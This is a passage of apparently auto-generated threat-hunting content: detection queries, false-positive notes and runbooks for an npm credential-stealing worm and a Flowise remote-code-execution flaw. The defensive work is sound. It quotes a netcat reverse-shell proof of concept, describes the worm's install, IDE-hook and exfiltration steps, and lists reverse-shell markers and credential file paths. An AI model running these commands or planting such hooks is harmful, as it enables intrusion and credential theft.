  • Developers legitimately adopting the Bun runtime for a project with unrelated scripts named math_init.js
  • Bun's own test suite or examples referencing similarly named JS files
  • EDR sandbox detonation of the collected sample
  • A dev deliberately naming an app entry file Math_Symbol.js (rare, high-suspicion)
Response runbook
1) Triage: confirm the bun binary's origin (was it downloaded to a temp dir then the dir deleted, as the article describes?) and capture Math_Symbol.js/math_init.js for hashing against vendor IOC lists. 2) Contain: isolate host, kill the bun process tree, block outbound to npm-cache.com and the GitHub exfil repo. 3) Hunt: enumerate every credential reachable from that environment — GitHub PATs, npm_ tokens, GitHub Actions secrets, AWS/SSM/Secrets Manager, K8s secrets, Vault, Stripe/Slack/Twilio/Azure/GCP keys — and rotate all; review GitHub for unexpected repos/commits and self-propagated package publishes.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("bun.exe","bun") or InitiatingProcessFileName in~ ("bun.exe","bun")
| where ProcessCommandLine has_any ("Math_Symbol.js","math_init.js") or InitiatingProcessCommandLine has_any ("Math_Symbol.js","math_init.js")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("bun","bun.exe") or ParentProcessName has_any ("bun","bun.exe")
| where ActingProcessCommandLine has_any ("Math_Symbol.js","math_init.js") or ParentProcessCommandLine has_any ("Math_Symbol.js","math_init.js")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

ChainDrop exfiltration to npm-cache[.]com domain AICommand & Control High
Hunts outbound network/DNS activity to npm-cache.com, the exfiltration domain Wiz flagged as a strong ChainDrop indicator of compromise. Any resolution or connection to this domain from a developer workstation or CI/CD runner indicates active data theft. Rationale: npm-cache.com is a concrete IOC explicitly called out by Wiz in the article as a strong indicator of compromise for ChainDrop exfiltration; a single hit is actionable.
ATT&CKT1567 T1071.001
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Typo-squat/parked-domain scanners or threat-intel crawlers resolving the IOC domain for research
  • A security tool proactively testing IOC connectivity
  • DNS sinkhole/RPZ logging the blocked lookup (still worth confirming which host asked)
Response runbook
1) Triage: identify the process (ContextImageFileName / InitiatingProcessFileName) and host that resolved npm-cache.com; confirm it correlates with a node/bun install event. 2) Contain: block npm-cache.com at DNS/proxy/firewall, isolate the originating host, and preserve process+network artifacts. 3) Hunt: pivot on the host for setup.mjs/Math_Symbol.js/math_init.js and rotate every token reachable from that environment; check GitHub for exfil repos described 'Shai-Hulud: Here We Go Again'.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "npm-cache.com"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery has "npm-cache.com"
| project TimeGenerated, SrcIpAddr, SrcHostname, DnsQuery, DnsResponseName
| order by TimeGenerated desc

ChainDrop payload files (setup.mjs / Math_Symbol.js / math_init.js) written to node_modules AIDelivery Medium
Hunts file-creation of the three named ChainDrop artifacts on developer or CI hosts. Catches the worm even before execution — e.g. a poisoned package landing on disk during dependency resolution — by flagging these exact filenames appearing under node_modules or install temp paths. Rationale: Anchored on the two verbatim payload filenames (Math_Symbol.js, math_init.js) and the dropper setup.mjs scoped to node_modules to avoid the generic setup.mjs FP; catches on-disk presence even if execution telemetry is missed.
ATT&CKT1195.002 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate project coincidentally shipping a file named math_init.js (low probability, but review)
  • Restore-from-backup or forensic copy re-creating these files during IR
  • Antivirus/EDR quarantine or sandbox extraction writing the artifact to a scan directory
  • Developer intentionally saving a captured sample for analysis
Response runbook
1) Triage: hash each dropped file and match against Wiz/Aikido/Socket/StepSecurity/Ox IOC bundles; identify the parent npm package + version. 2) Contain: quarantine the files, isolate the host, and treat the workstation/CI runner as compromised (rebuild from clean backup per vendor guidance). 3) Hunt: sweep all hosts for the same filenames + npm-cache.com egress, rotate every reachable token, and audit GitHub org repos/branches for attacker commits and newly published poisoned package versions.
DeviceFileEvents
| where Timestamp > ago(14d)
| where ActionType == "FileCreated"
| where FileName in~ ("Math_Symbol.js","math_init.js") or (FileName =~ "setup.mjs" and FolderPath has "node_modules")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FileName, FolderPath, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where EventType == "FileCreated"
| where TargetFileName in~ ("Math_Symbol.js","math_init.js") or (TargetFileName =~ "setup.mjs" and TargetFilePath has "node_modules")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetFileName, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or SHA1 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or MD5 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or SHA1 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63") or MD5 in~ ("54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668", "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb", "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc", "35a672cf34b996b91f3e1c28cbf3a05a37e036e4", "686aa40d0fc22c8d569494543a0f891f359f2f99", "f525d52ceb966516686b482d3dc0137028cc6a63"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Malicious JavaScript entity file written into Flowise storage by node
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Flowise node process spawning shell/netcat (TypeORM DataSource RCE) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-69251: Flowise RCE via TypeORM DataSource
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Reverse-shell egress from netcat/socat on Flowise host
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Flowise node process spawning shell/netcat (TypeORM DataSource RCE) AIExploitation High
Hunts the Flowise server process (node) spawning a Unix shell or netcat/socat, which is the execution primitive of the CVE-2026-69251 TypeORM DataSource entity-load RCE. The uploaded JS entity runs `process.mainModule.require('child_process').execSync('/usr/bin/nc ... -e /bin/sh')`, so the running node service becomes the parent of nc/sh. Rationale: Uses the article's exact execution chain — node (Flowise server) invoking child_process to run '/usr/bin/nc 172.17.0.1 1337 -e /bin/sh'. Parent=node + child nc/socat (or shell with -e/dev-tcp reverse-shell markers) is near-zero in normal Flowise operation. Cross-checked against elttam's multi-flaw Flowise disclosure covering TypeORM DataSource entity loading. Cross-checked against: • https://github.com/advisories/GHSA-g32j-mmxr-gfq5 • https://www.cryptika.com/six-flowise-rce-flaws-let-attackers-execute-code-on-ai-workflow-servers/ • https://typeorm.io/docs/data-source/data-source/
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • npm/yarn postinstall lifecycle scripts where node spawns sh -c to run a build step
  • A container entrypoint wrapper that has node exec a shell for health checks
  • Legitimate Flowise custom tool/function nodes an operator intentionally uses to shell out
  • Ops staff debugging inside the Flowise container via a node REPL that spawns bash
  • Supervisor/PM2-style process managers restarting node via a shell
Suppression filter
| where not (ChildCmd has_any ("npm","yarn","node_modules/.bin","npm-lifecycle") or ParentCmd has_any ("npm","yarn","pm2"))
Response runbook
1) Triage: pull the full process tree on the host — confirm parent is the Flowise node service and inspect ChildCmd for reverse-shell flags (nc -e, /dev/tcp, bash -i) and the destination IP:port. 2) Contain: isolate the host/container, kill the nc/sh PID, and block the outbound C2 IP/port at the egress firewall; snapshot the container for forensics. 3) Hunt: review Flowise access logs for POST /api/v1/document-store/loader/process and Upsert calls near the alert time, identify the authenticated user/API token, and search other hosts for node spawning shells.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs","node.js")
| where FileName in~ ("nc","ncat","netcat","socat","sh","bash","dash","ksh")
| where FileName in~ ("nc","ncat","netcat","socat")
      or ProcessCommandLine has_any ("-e /bin/sh","-e /bin/bash","/dev/tcp/","bash -i","0>&1")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          Child = FileName,
          ChildCmd = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node","nodejs")
| where ActingProcessName has_any ("nc","ncat","netcat","socat","sh","bash","dash")
| where ActingProcessName has_any ("nc","ncat","netcat","socat")
      or ActingProcessCommandLine has_any ("-e /bin/sh","-e /bin/bash","/dev/tcp/","bash -i","0>&1")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: Flowise node process spawning shell or netcat
id: 6f2b1c8e-4a2d-4d9e-9b1a-2c7f9d3e1a55
description: Detects the Flowise node server spawning a Unix shell or netcat/socat, the execution primitive of CVE-2026-69251 TypeORM DataSource entity-load RCE
references:
  - https://github.com/advisories/GHSA-g32j-mmxr-gfq5
author: SOC Detection Engineering
date: 2026/08/04
tags:
  - attack.t1059.004
  - attack.t1190
logsource:
  category: process_creation
  product: linux
detection:
  parent:
    ParentImage|endswith:
      - '/node'
      - '/nodejs'
  child_binary:
    Image|endswith:
      - '/nc'

Reverse-shell egress from netcat/socat on Flowise host AICommand & Control High
Hunts outbound network connections initiated by nc/ncat/netcat/socat (or a shell carrying reverse-shell flags) on the Flowise server — the command-and-control leg of the CVE-2026-69251 RCE where the payload connects back to attacker infrastructure (PoC used 172.17.0.1:1337). These tools have no legitimate role in a Flowise application container. Rationale: Targets the reverse-shell C2 described in the PoC (nc 172.17.0.1 1337 -e /bin/sh). Rather than hardcode the Docker-internal PoC IP, it flags any nc/socat egress or shell with reverse-shell flags — these binaries making outbound connections on a Flowise app host is high-signal. Sentinel left blank: ASIM ImNetworkSession carries no initiating-process attribution, so the same logic is covered by the ImProcessCreate execution UC. Cross-checked against: • https://github.com/advisories/GHSA-g32j-mmxr-gfq5 • https://www.cryptika.com/six-flowise-rce-flaws-let-attackers-execute-code-on-ai-workflow-servers/
ATT&CKT1571 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin using nc for a legitimate port/connectivity test from the host
  • socat used as a legitimate TCP relay/port-forward in a service's startup script
  • Monitoring or backup tooling that bundles netcat for health probes
  • Container network debugging (nc -z) during troubleshooting
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("-z ","-w ","port check","healthcheck") or RemoteIP startswith "127.")
Response runbook
1) Triage: resolve the RemoteIP/RemotePort and InitiatingProcessCommandLine — confirm the reverse-shell shape (-e, /dev/tcp) and whether the destination is external/attacker-owned. 2) Contain: isolate the host, terminate the nc/socat process, and block the destination IP:port at egress; capture memory/container snapshot. 3) Hunt: correlate to the parent Flowise node process, review who authenticated to Flowise and which chatflow/document-store was upserted, and sweep other Flowise hosts for the same egress binary.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName in~ ("nc","ncat","netcat","socat")
      or InitiatingProcessCommandLine has_any ("-e /bin/sh","-e /bin/bash","/dev/tcp/","bash -i","0>&1")
| project Timestamp, DeviceName,
          InitiatingProcessAccountName,

          InitiatingProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc

Malicious JavaScript entity file written into Flowise storage by node AIDelivery Medium
Hunts the Flowise node process writing a .js file into the Flowise storage/home directory — the delivery step where an attacker uploads a JS payload via the Document Store File Loader (POST /api/v1/document-store/loader/process) that is later loaded as a TypeORM DataSource entity. Document stores normally hold PDFs/text, so a runtime-written .js blob is anomalous. Rationale: Uses the article's delivery artifact — a .js file (PoC filename rce.js, mime application/x-javascript) uploaded via the Document Store File Loader and persisted into Flowise's FILE-STORAGE/home path, then referenced as a TypeORM entity. A running node service writing executable .js into its document-store/storage tree is abnormal (normal ingest is PDF/text). Hunting tier because attacker-controlled filename and exact storage subpath vary. Cross-checked against: • https://github.com/advisories/GHSA-g32j-mmxr-gfq5 • https://www.cryptika.com/six-flowise-rce-flaws-let-attackers-execute-code-on-ai-workflow-servers/
ATT&CKT1190 T1059.007
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Flowise application updates/rebuilds writing .js assets under its install path (should be outside the storage/.flowise data tree)
  • A developer legitimately ingesting source-code files into a document store for a code-QA chatflow
  • Flowise cache/temp .js files written during normal flow execution
  • Backup/restore jobs repopulating the .flowise storage directory
Suppression filter
| where FolderPath !has "node_modules" and FolderPath !has "/dist/" and FolderPath !has "/build/"
Response runbook
1) Triage: retrieve the written .js file and inspect its contents for RCE gadgets such as process.mainModule.require('child_process'), execSync, or reverse-shell strings; note the SHA256. 2) Contain: quarantine the file, isolate the host if the payload is malicious, and revoke the Flowise session/API token of the uploading user. 3) Hunt: pivot to DeviceProcessEvents for node spawning shells/nc referencing that path, and review document-store loader/upsert API calls to enumerate any other uploaded entity files.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where InitiatingProcessFileName in~ ("node","nodejs")
| where FileName endswith ".js"
| where FolderPath has_any ("flowise",".flowise","storage","document-store","uploads")
| project Timestamp, DeviceName,
          InitiatingProcessAccountName,
          InitiatingProcessCommandLine,
          FileName, FolderPath, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType == "FileCreated"
| where ActingProcessName has_any ("node","nodejs")
| where TargetFileName endswith ".js"
| where TargetFilePath has_any ("flowise",".flowise","storage","document-store","uploads")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, TargetFileName, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks

The Hacker News
2026-08-04 12 use cases 4 techniques 5 kill-chain phases detected

A credential-stealing npm worm that first appeared in keyv@6.0.0 spread beyond the Keyv and Cacheable namespaces into hundreds of packages across multiple organizations on August 4, 2026. SafeDep verified 353 poisoned versions across 79 package names in the npm registry. Its monitoring put the wider footprint at 442 versions across 353 names, while Aikido later reported at least 868 packages

Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains

npm preinstall lifecycle spawns 'node setup.mjs' / Math_Symbol.js (Shai-Hulud worm hook) AIInstallation High
Hunts the Shai-Hulud 'Here We Go Again' worm's install-time execution: a poisoned npm package (keyv@6.0.0, flat-cache@6.1.23, cache-manager@7.2.9, etc.) declares `node setup.mjs` as its preinstall command and ships setup.mjs + Math_Symbol.js. Fires when node executes those exact staging files inside a package-install context on a dev workstation or CI runner. Rationale: Anchors on the article's verbatim `node setup.mjs` preinstall command and the two published payload files (setup.mjs, Math_Symbol.js); Math_Symbol.js is a near-unique string with effectively zero benign use. Cross-checked against Socket, Aikido and Datadog Security Labs write-ups confirming setup.mjs is the preinstall stage-one. Cross-checked against: • https://socket.dev/blog/popular-npm-packages-in-the-keyv-and-cacheable-namespaces-compromised-in-active-supply-chain • https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate in-house package that genuinely ships a build helper literally named setup.mjs and runs it from a lifecycle script
  • Monorepo bootstrap tooling that invokes 'node setup.mjs' during 'npm ci' on CI runners
  • Developer manually running 'node setup.mjs' from an unrelated project of the same filename
  • Math_Symbol.js should almost never appear benignly — treat any hit on that token as high priority
Suppression filter
| where not (ProcessCommandLine has "setup.mjs" and FolderPath !contains "node_modules" and ProcessCommandLine !has "Math_Symbol.js" and InitiatingProcessCommandLine !has_any ("preinstall","npm ci","npm install"))
Response runbook
1) TRIAGE: Pull the full command line and parent chain; confirm the process worked out of a node_modules/<pkg> path and identify the resolved package + version from the install log or lockfile. Hash the setup.mjs/Math_Symbol.js and compare to campaign SHA256s. 2) CONTAIN: Isolate the host/runner and treat it as credential-exposed. Per SafeDep guidance, locate and remove the malware's token-revocation watcher BEFORE rotating any tokens (rotating first can trigger an attacker-supplied handler). 3) HUNT: Search for child Bun execution, contact to GitHub release downloads by node, and creation of .claude/.vscode hook files on the same host; audit npm/GitHub/cloud tokens resolvable from that machine for abuse.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("node.exe","node")
| where ProcessCommandLine has_any ("setup.mjs","Math_Symbol.js")
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("npm.exe","node.exe","node","cmd.exe","sh","bash","pnpm.exe","yarn.exe")
   or InitiatingProcessCommandLine has_any ("preinstall","npm install","npm ci","npm-cli.js","lifecycle")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has "node"
| where ActingProcessCommandLine has_any ("setup.mjs","Math_Symbol.js")
| where ParentProcessName has_any ("npm","node","cmd","bash","sh","pnpm","yarn")
   or ParentProcessCommandLine has_any ("preinstall","npm install","npm ci","lifecycle")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Standalone Bun 1.3.13 runtime pulled/executed inside npm install chain (worm stage-two) AIInstallation Medium
Hunts the worm's evasion step: setup.mjs downloads the Bun 1.3.13 runtime from GitHub and execFileSyncs it to run the compiled 727,680-byte credential-stealing bundle, keeping the stealer logic out of the preinstall file. Fires when a Bun process is spawned by node or from a setup.mjs context, or when node itself fetches a Bun release binary. Rationale: Uses the article's exact stage-two mechanic — setup.mjs fetching Bun 1.3.13 and execFileSync'ing it — corroborated by Upwind and Datadog which document Bun v1.3.13 downloaded from GitHub and invoked via execFileSync. Bun as a direct child of node is the anomalous pivot; standalone Bun is legit but node-spawning-Bun during install is not. Cross-checked against: • https://www.upwind.io/feed/mini-shai-hulud-npm-supply-chain-worm • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
ATT&CKT1105 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Projects that legitimately use Bun as a task runner invoked from Node scripts (e.g. 'node' orchestrator calling 'bun run')
  • CI pipelines that install Bun via a Node-based setup action
  • Developers experimenting with Bun where a node process shells out to bun
  • Toolchains bundling bun as an optional dependency spawned by a node CLI
Suppression filter
| where not (InitiatingProcessCommandLine has "bun run" and InitiatingProcessCommandLine !has_any ("setup.mjs","Math_Symbol.js") and FolderPath has_any ("\\.bun\\","/.bun/"))
Response runbook
1) TRIAGE: Confirm the Bun binary path (unexpected under a package/temp dir vs a user-installed ~/.bun) and inspect the parent node command line for setup.mjs/Math_Symbol.js. Verify the Bun binary hash/version = 1.3.13. 2) CONTAIN: Isolate the host and block outbound from the Bun/node process; treat all locally-resolvable credentials as exposed. 3) HUNT: Look on the same host for a preceding 'node setup.mjs' preinstall event, GitHub release fetches of the Bun binary, credential-file access by node/bun, and creation of Shai-Hulud exfil artifacts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("bun","bun.exe")
| where InitiatingProcessFileName in~ ("node","node.exe")
   or InitiatingProcessCommandLine has_any ("setup.mjs","Math_Symbol.js")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has "bun"
| where ParentProcessName has "node" or ParentProcessCommandLine has_any ("setup.mjs","Math_Symbol.js")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Shai-Hulud plants Claude Code / VS Code auto-execution hook (setup.mjs in .claude or .vscode) AIInstallation High
Hunts the worm's second execution path: it writes .claude/settings.json (SessionStart hook), .vscode/tasks.json (Environment Setup task, runOn: folderOpen), and cross-referencing setup.mjs files into a repo's .claude and .vscode directories so the payload runs when a developer trusts the workspace. Fires on creation of setup.mjs (or the hook manifests) inside those config directories. Rationale: Anchors on the article's precise artifacts — .claude/settings.json SessionStart hook, .vscode/tasks.json runOn:folderOpen, and cross-referencing setup.mjs files in both dirs. A setup.mjs living inside .claude/ or .vscode/ is essentially never legitimate, making it a high-fidelity, worm-specific persistence signal confirmed by JFrog and Semgrep's April lightning-PyPI report of the same hooks. Cross-checked against: • https://research.jfrog.com/post/shai-hulud-here-we-go-again/ • https://www.stepsecurity.io/blog/shai-hulud-here-we-go-again-mass-npm-supply-chain-attack-hits-the-antv-ecosystem
ATT&CKT1546 T1195.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A team that legitimately keeps a workspace bootstrap script named setup.mjs — but placing it inside .vscode/.claude is unusual and worth review
  • Legit edits to .vscode/tasks.json or .claude/settings.json alone (query requires the setup.mjs pairing for high confidence)
  • Repo templating tools that scaffold .vscode automation tasks
  • IDE extensions writing their own settings.json (won't match the setup.mjs selection)
Response runbook
1) TRIAGE: Open the dropped .claude/settings.json and .vscode/tasks.json — confirm the SessionStart hook / runOn:folderOpen task invokes setup.mjs, and read setup.mjs for the Bun-download stage. Identify the initiating process (git checkout vs node write). 2) CONTAIN: Quarantine the repo/workspace, revoke workspace trust, and block the host from opening it in VS Code/Claude Code until cleaned; treat the host as credential-exposed if the hook already fired. 3) HUNT: Search version control for the planting commit (author github-actions[bot] / claude@users.noreply.github.com), and check other cloned repos on the fleet for the same .claude/.vscode hook files.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has "\\.claude\\" or FolderPath has "/.claude/" or FolderPath has "\\.vscode\\" or FolderPath has "/.vscode/")
| where FileName =~ "setup.mjs"
   or (FileName =~ "settings.json" and (FolderPath has "\\.claude\\" or FolderPath has "/.claude/"))
   or (FileName =~ "tasks.json" and (FolderPath has "\\.vscode\\" or FolderPath has "/.vscode/"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where (TargetFilePath has "\\.claude\\" or TargetFilePath has "/.claude/" or TargetFilePath has "\\.vscode\\" or TargetFilePath has "/.vscode/")
| where TargetFileName =~ "setup.mjs"
   or (TargetFileName =~ "settings.json" and TargetFilePath has ".claude")
   or (TargetFileName =~ "tasks.json" and TargetFilePath has ".vscode")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFileName, TargetFilePath, EventType, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Node/Bun reads developer & cloud credential stores during npm activity (worm harvest) AIActions on Objectives Medium
Hunts the credential-harvesting core of the bundle, which collects GitHub, npm, cloud, Vault, Kubernetes, database and private-key material. Fires when a node or bun process touches high-value credential stores (~/.aws/credentials, ~/.kube/config, .vault-token, .git-credentials, gh hosts, SSH private keys) — access patterns a JS runtime rarely performs benignly. Rationale: Maps the article's explicit harvest list (GitHub, npm, cloud, Vault, Kubernetes, DB, private-key) to the concrete on-disk stores a JS runtime would read; Falcon FileOpenInfo captures the read directly, while Defender/Sentinel catch node/bun-initiated file events on those paths. Datadog left empty because the listed linux.auditd schema exposes no file-path attribute to filter on. .npmrc deliberately excluded (npm reads it normally). Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
ATT&CKT1552.001 T1552.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legit node CLIs built on the AWS SDK reading ~/.aws/credentials (e.g. serverless/CDK tooling)
  • kubectl-adjacent node tooling reading ~/.kube/config
  • Node-based git helpers reading .git-credentials
  • Developer scripts that load SSH keys for programmatic git over a node process
  • gh-cli wrapper tools reading ~/.config/gh/hosts.yml
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("aws","cdk","serverless","kubectl","gh ") and InitiatingProcessCommandLine !has_any ("setup.mjs","Math_Symbol.js"))
Response runbook
